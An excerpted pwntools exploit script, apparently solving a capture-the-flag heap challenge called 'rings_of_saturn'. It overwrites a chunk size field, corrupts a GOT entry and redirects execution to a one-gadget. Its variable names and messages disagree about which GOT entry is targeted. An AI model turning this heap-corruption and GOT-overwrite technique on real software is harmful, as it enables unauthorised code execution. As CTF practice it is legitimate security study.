...
# p = process("./rings_of_saturn_dbg_patched")
# p = gdb.debug(
#     "./rings_of_saturn_dbg_patched",
#     """b main
# continue""",
# )
# gdb.attach(
...
onegadget = int(p.recvline().split(b" ")[-1], 16)
...
overwrite_size = 1040 + 1040 + 1  # See how2heap
payload = p64(0x3E1)
payload += p64(overwrite_size)
print(f"Overwriting next size with {overwrite_size:#016x} {p64(overwrite_size)}")
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", bytes(f"{len(payload)}", "utf-8")).decode("utf-8"))
print(p.sendlineafter(b"> ", payload).decode("utf-8"))
...
e = ELF("../dist/rings_of_saturn")
FREE_HOOK_ADDRESS = e.got["fprintf"]
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(
...
onegadget_write = p64(onegadget + 0xBB0F7)
print(f"Overwriting exit@GOT with one gadget {onegadget_write}")
print(p.sendlineafter(b"> ", b"3").decode("utf-8"))
print(p.sendlineafter(b"> ", b"8").decode("utf-8"))
print(p.sendlineafter(b"> ", onegadget_write).decode("utf-8"))
